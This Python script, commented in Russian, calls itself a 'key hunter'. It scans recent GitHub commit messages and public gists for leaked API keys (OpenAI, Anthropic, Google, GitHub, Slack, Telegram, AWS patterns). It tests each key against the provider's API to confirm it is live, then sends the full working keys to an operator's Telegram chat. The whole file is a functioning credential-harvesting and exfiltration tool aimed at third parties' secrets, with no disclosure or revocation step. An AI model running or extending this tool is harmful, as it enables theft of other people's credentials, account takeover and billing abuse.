#!/usr/bin/env python3
"""
Мультиканальный охотник за ключами.
Каналы: GitHub commit search, GitHub gists, GitLab events.
Находки валидируются и шлются в TG.
"""
import json
import os
import re
import time
import urllib.parse
import urllib.request
import urllib.error

ROOT = os.path.dirname(os.path.abspath(__file__))

def load_env():
    env = {}
    p = os.path.join(ROOT, ".env")
    if os.path.exists(p):
        for line in open(p, encoding="utf-8"):
            line = line.strip()
            if line and not line.startswith("#") and "=" in line:
                k, v = line.split("=", 1)
                env[k.strip()] = v.strip()
    return env

ENV = load_env()
GH_TOKEN = ENV.get("GITHUB_TOKEN", "")
TG_TOKEN = ENV.get("TG_BOT_TOKEN", "")
TG_CHAT = ENV.get("TG_CHAT_ID", "")
SEEN_FILE = os.path.join(ROOT, "hunter_seen.json")
SEEN = set(json.load(open(SEEN_FILE)) if os.path.exists(SEEN_FILE) else [])

PAT = re.compile(
    r"(sk-[A-Za-z0-9_-]{20,}|sk-ant-[A-Za-z0-9_-]{20,}|AIza[0-9A-Za-z_-]{35}"
    r"|ghp_[0-9A-Za-z]{36}|glpat-[0-9A-Za-z_-]{20}|xox[bpoa]-[0-9A-Za-z-]{10,}"
    r"|\d{8,10}:[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16})"
)

def http(url, headers=None, timeout=30):
    h = {"User-Agent": "ahmia-hunter"}
    if "github.com" in url and GH_TOKEN:
        h["Authorization"] = f"Bearer {GH_TOKEN}"
    req = urllib.request.Request(url, headers=h)
    return urllib.request.urlopen(req, timeout=timeout)

def tg(text):
    if not (TG_TOKEN and TG_CHAT):
        return
    try:
        data = json.dumps({"chat_id": TG_CHAT, "text": text}).encode()
        req = urllib.request.Request(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                                     data=data, headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=15)
    except Exception:
        pass

def validate(key):
    try:
        if key.startswith("AIza"):
            r = http(f"https://www.googleapis.com/oauth2/v1/tokeninfo?access_token={key}", timeout=10)
            return r.status == 200
        if key.startswith(("sk-ant-", "sk-")):
            req = urllib.request.Request("https://api.anthropic.com/v1/models" if key.startswith("sk-ant-") else "https://api.openai.com/v1/models",
                                         headers={"Authorization": f"Bearer {key}"})
            try:
                urllib.request.urlopen(req, timeout=10)
                return True
            except urllib.error.HTTPError as e:
                return e.code != 401
        if ":" in key and key.split(":")[0].isdigit():
            r = http(f"https://api.telegram.org/bot{key}/getMe", timeout=10)
            return b'"ok":true' in r.read()
        if key.startswith("ghp_"):
            req = urllib.request.Request("https://api.github.com/user", headers={"Authorization": f"Bearer {key}", "User-Agent": "h"})
            urllib.request.urlopen(req, timeout=10)
            return True
    except Exception:
        return False
    return False

def check(text, source):
    hits = 0
    for k in set(PAT.findall(text)):
        if k in SEEN or re.search(r"\.{2,}|xxxx|your|example", k, re.I):
            continue
        SEEN.add(k)
        if validate(k):
            print(f"*** LIVE: {k[:20]}... ({source})", flush=True)
            tg(f"LIVE KEY ({source})\n{k}")
            hits += 1
    return hits

def channel_commits():
    """GitHub commit search: свежие коммиты с паттернами ключей."""
    print("[*] канал: commit search", flush=True)
    total = 0
    for q in ["sk-ant-", "AIzaSy", "glpat-", "xoxb-"]:
        url = ("https://api.github.com/search/commits?q=" + urllib.parse.quote(q) +
               "&sort=committer-date&order=desc&per_page=30")
        try:
            r = http(url, {"Accept": "application/vnd.github.cloak-preview+json"}, 30)
            data = json.loads(r.read())
            for item in data.get("items", []):
                msg = item.get("commit", {}).get("message", "")
                repo = item.get("repository", {}).get("full_name", "?")
                total += check(msg, f"commit {repo}")
        except Exception as e:
            print(f"[!] commit search '{q}': {e}", flush=True)
        time.sleep(6)  # search API жёсткий по лимитам
    print(f"    живых: {total}", flush=True)

def channel_gists():
    """Публичные гисты, свежие первыми."""
    print("[*] канал: gists", flush=True)
    total = 0
    try:
        r = http("https://api.github.com/gists/public?per_page=30", timeout=30)
        gists = json.loads(r.read())
        for g in gists:
            for fname, f in (g.get("files") or {}).items():
                raw = f.get("raw_url")
                if not raw:
                    continue
                try:
                    txt = http(raw, timeout=15).read().decode("utf-8", errors="replace")[:200000]
                    total += check(txt, f"gist {g.get('id','')[:8]}")
                except Exception:
                    pass
    except Exception as e:
        print(f"[!] gists: {e}", flush=True)
    print(f"    живых: {total}", flush=True)

def channel_gitlab():
    """GitLab публичные события закрыты за авторизацией (401) — канал отключён."""
    print("[*] канал: gitlab — отключён (требует auth с 2024)", flush=True)

if __name__ == "__main__":
    channel_commits()
    channel_gists()
    channel_gitlab()
    json.dump(sorted(SEEN), open(SEEN_FILE, "w"))
    print(f"[*] done. seen: {len(SEEN)}", flush=True)
